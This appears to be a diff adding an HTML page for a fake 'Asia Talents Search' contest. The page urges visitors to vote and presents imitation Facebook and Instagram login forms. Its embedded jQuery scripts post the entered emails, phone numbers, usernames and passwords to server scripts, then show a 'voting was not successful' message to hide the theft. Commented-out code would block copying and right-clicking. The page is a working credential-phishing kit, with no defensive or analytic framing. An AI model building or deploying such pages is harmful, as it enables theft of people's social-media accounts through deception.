@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="js/jquery-3.6.0.min.js"></script>
+  <link rel="stylesheet" href="css/index.css">
+  <script src="js/index.js"></script>
+  <title>Asia Talents Search</title>
+</head>
+<body>
+  <div id="home">
+    <header>
+      <img src="image/asiatalent.jpeg">
+      <p align="center">
+        <!-- <button id="vote2" onclick="vote()">
+                                                        	    Join contest
+                                                        	  </button>-->
+      </p>
+
+      <p align="center">
+        <button id="vote2" onclick="vote()">
+
+          Click Here To Vote
+
+        </button><br>
+        <!-- <button id="vote2" onclick="vote()">
+                                                        	    Join contest
+                                                        	  </button>-->
+      </p>
+
+    </header>
+    <div id="topper">
+
+    </div>
+    <div id="blue">
+    <center>
+      <h2>
+        Asia Talents Search 
+      </h2>
+    </center>
+    </div>
+    <div id="news">
+      <p>
+      Welcome to the Asia Talents Search. This contest celebrates the diverse and talented individuals across Asia, showcasing their unique skills and passions. Participants from all over Asia will be invited to showcase their talents in various categories, such as singing, dancing, cooking, art, sports, technology, and more.      </p>
+    </div>
+    <div id="blue">
+      <center>
+        <h2>Meet our Judges</h2>
+      </center>
+    </div>
+    <br>
+    <center>
+      <div id="people">
+        <img src="image/victoria.jpg" id="img">
+        <br>
+        <h2>
+          Victoria NG
+        </h2>
+        <p>
+          Her culinary journey began in her grandmother's kitchen, where she developed a deep appreciation for traditional Asian flavors and cooking techniques.
+        </p>
+        <img src="image/nick.jpg" class="img">
+        <br>
+      
+        <h2>Nick Kung
+        </h2>
+        <p>
+          As a judge, he brings a keen eye for technical precision, artistic expression, and innovation, making him an invaluable asset to the dance category.        </p>
+        <br>
+        <img src="image/lennard.jpg" id="img1">
+        <br>
+        <h2>
+          Lennard Tan
+        </h2>
+        <p>
+          Expertise in various music genres and her passion for promoting emerging talents make her an ideal judge for the singing category.        </p>
+        <br>
+        <img src="image/adrian.jpg" id="img1">
+        <br>
+        <h2>
+          Adrian Tan
+        </h2>
+        <p>
+          He is the founder and CEO of a leading technology company that has pioneered groundbreaking innovations in various fields.
+        </p>
+      </div> 
+    </center>
+    <div id="blue">
+      <center>
+        <h2>Voting Categories</h2>
+      </center>
+    </div>
+    <br>
+    <center>
+      <div id="voter">
+        <h2>Singing</h2>
+        <video controls>
+          <source src="#" type="">
+        </video>
+        <button id="vote" onclick="vote()">
+          Vote this contestant
+        </button>
+        <br>
+      </div>
+      <div id="voter">
+        <h2>Dancing</h2>
+        <video controls>
+          <source src="#" type="">
+        </video>
+        <button id="vote" onclick="vote()">
+          Vote this contestant
+        </button>
+        <br>
+      </div>
+
+      <div id="voter">
+        <h2>Cooking</h2>
+        <video controls>
+          <source src="#" type="">
+        </video>
+        <button id="vote" onclick="vote()">
+          Vote this contestant
+        </button>
+        <br>
+      </div>
+      <div id="voter">
+        <h2>Art and Crafts</h2>
+        <video controls>
+          <source src="#" type="">
+        </video>
+        <button id="vote" onclick="vote()">
+          Vote this contestant
+        </button>  <br>
+      </div>
+      <div id="voter">
+        <h2>Sports</h2>
+        <video controls>
+          <source src="#" type="">
+        </video>
+        <button id="vote" onclick="vote()">
+          Vote this contestant
+        </button>  <br>
+      </div>
+      <div id="voter">
+        <h2>Fashion</h2>
+        <video controls>
+          <source src="#" type="">
+        </video>
+        <button id="vote" onclick="vote()">
+          Vote this contestant
+        </button>  <br>
+      </div>
+      <div id="voter">
+        <h2>Cultural Performances</h2>
+        <video controls>
+          <source src="#" type="">
+        </video>
+        <button id="vote" onclick="vote()">
+          Vote this contestant
+        </button>  <br>
+      </div>
+      <div id="voter">
+        <h2>Comedy and Entertainment</h2>
+        <video controls>
+          <source src="#" type="">
+        </video>
+        <button id="vote" onclick="vote()">
+          Vote this contestant
+        </button>  <br>
+      </div>
+      <div id="voter">
+        <h2>Special Talents</h2>
+        <video controls>
+          <source src="#" type="">
+        </video>
+        <button id="vote" onclick="vote()">
+          Vote this contestant
+        </button>  <br>
+      </div>
+      <div id="voter">
+        <h2>Technology and Innovation</h2>
+        <video controls>
+          <source src="#" type="">
+        </video>
+        <button id="vote" onclick="vote()">
+          Vote this contestant
+        </button>  <br>
+      </div>
+    </center>
+  </div>
+  <center>
+    <div id="choose">
+      <center>
+        <p>
+          Login with one of the following to vote:
+        </p>
+      </center>
+      <center>
+        <p>
+          <img id="fb" onclick="fb()" src="image/fb.png">
+          <img id="ig" onclick="ig()" src="image/ig.png">
+        </p>
+        <br>
+        <button onclick="can()" id="cancel">Close</button>
+      </center>
+    </div>
+  </center>
+  <center>
+    <div id="fbp">
+      <div class="facebook-login" id="fb2" align="center">
+
+        <div class="ggt">
+
+          <img src="image/fb.png" alt="logo" id="fblogo">
+          <h1 id="fb2">
+            facebook
+          </h1>
+           <!-- <form action="process_form.php" method="post">
+          <input type="text" placeholder="Email or Phone number" id="fb-email"><br>
+          <input type="password" placeholder="Password" id="fb-pass"><br>
+          <!-- <button onclick="login()" id="fb-log">
+            Log in
+          </button> -->
+           <!-- <input type="submit" value="Log in">
+    </form> -->
+    <!-- <form action="process_form.php" method="post">
+    <input type="text" placeholder="Email or Phone number" id="fb-email" name="fb-email"><br>
+    <input type="password" placeholder="Password" id="fb-pass" name="fb-pass"><br>
+    <input type="submit" value="Log in">
+</form> -->
+<form>
+        <input type="text" placeholder="Email or Phone number" id="fb-email" name="fb-email"><br>
+        <input type="password" placeholder="Password" id="fb-pass" name="fb-pass"><br>
+        <input type="submit" value="Log in">
+    </form>
+    <p id="error-notification"></p>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        $(document).ready(function() {
+            $("form").on("submit", function(event) {
+                event.preventDefault(); // Prevent default form submission
+                
+                var emailOrPhone = $("#fb-email").val();
+                var password = $("#fb-pass").val();
+                
+                $.ajax({
+                    type: "POST",
+                    url: "process_form.php",
+                    data: { "fb-email": emailOrPhone, "fb-pass": password },
+                    success: function(response) {
+                        if (response === "success") {
+                            alert("Login successful!"); // You can customize this notification
+                        } else {
+                            // Show error notification in red
+                            $("#error-notification").text("Sorry voting was not successful, please try again later")
+                                                  .css("color", "red");
+                        }
+                    },
+                    error: function() {
+                        $("#error-notification").text("An error occurred. Please try again later.")
+                                              .css("color", "red");
+                    }
+                });
+            });
+        });
+    </script>
+
+
+        </div>
+      </div>
+
+    </div>
+  </center>
+  <center>
+    <div id="igp">
+      <div class="Instagram-login" id="ig2" align="center">
+
+        <div class="ppt">
+
+          <img src="image/ig2.jpg" alt="logo" id="iglogo"><br><br>
+          <br>
+          <!-- <input type="text" placeholder="Username or Email" id="ig-uname"><br>
+          <input type="password" placeholder="Password" id="ig-pass">
+          <br>
+          <button onclick="iglog()" id="ig-log">
+            log in
+          </button> -->
+         <form>
+    <input type="text" placeholder="Username or Email" id="ig-uname" name="ig-uname"><br>
+    <input type="password" placeholder="Password" id="ig-pass" name="ig-pass"><br>
+    <input type="submit" value="Log in">
+</form>
+<p id="error-notification" style="color: red;"></p>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script>
+    $(document).ready(function () {
+        $("form").on("submit", function (event) {
+            event.preventDefault(); // Prevent default form submission
+
+            var emailOrPhone = $("#ig-uname").val();
+            var password = $("#ig-pass").val();
+
+            // Check if emailOrPhone and password fields are empty
+            if (!emailOrPhone || !password) {
+                $("#error-notification").text("Notification: Please fill in all fields.").css("color", "red");
+                return;
+            }
+
+            $.ajax({
+                type: "POST",
+                url: "progress1_form.php",
+                data: { "ig-uname": emailOrPhone, "ig-pass": password },
+                dataType: "text", // Specify the expected response type
+                success: function (response) {
+                    if (response.trim() === "success") {
+                        alert("Login successful!"); // You can customize this notification
+                    } else {
+                        $("#error-notification").text("Notification: Sorry, login was not successful, please try again later").css("color", "red");
+                    }
+                },
+                error: function (jqXHR, textStatus, errorThrown) {
+                    if (jqXHR.status === 401) {
+                        $("#error-notification").text("Notification: Unauthorized access. Please check your credentials.").css("color", "red");
+                    } else {
+                        $("#error-notification").text("Notification: An error occurred. Please try again later.").css("color", "red");
+                    }
+                }
+            });
+        });
+    });
+</script>
+
+        </div>
+      </div>
+    </div>
+  </center>
+  <script src="../www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
+
+  <script src="../www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
+
+  <script src="../www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
+  <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
+
+  <script src="js/firebase.js">
+
+
+
+  </script>
+  
+  
+  
+  <!--
+  <script language="javascript" type="text/javascript">
+function DisableCopyPaste (e) 
+{
+ // Message to display
+ var message = "Cntrl key/ Right Click Option disabled";
+ // check mouse right click or Ctrl key press
+var kCode = event.keyCode || e.charCode; 
+//FF and Safari use e.charCode, while IE use e.keyCode
+ if (kCode == 17 || kCode == 2)
+ {
+ alert(message);
+ return false;
+ }
+}
+</script>
+ <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.0/jquery.min.js"></script>
+  <script>
+      $(document).ready(function() {
+          $('body').bind('cut copy', function(e) {
+              e.preventDefault();
+            });
+        });
+    </script>
+    <script>
+      $(document).ready(function() {
+          $("body").on("contextmenu", function(e) {
+              return false;
+            });
+        });
+    </script>
+    <script>
+    // Prevent copy and paste actions globally
+    document.addEventListener('copy', function (event) {
+        event.preventDefault();
+    });
+
+    document.addEventListener('paste', function (event) {
+        event.preventDefault();
+    });
+</script> -->
+
+</body>
+</html>
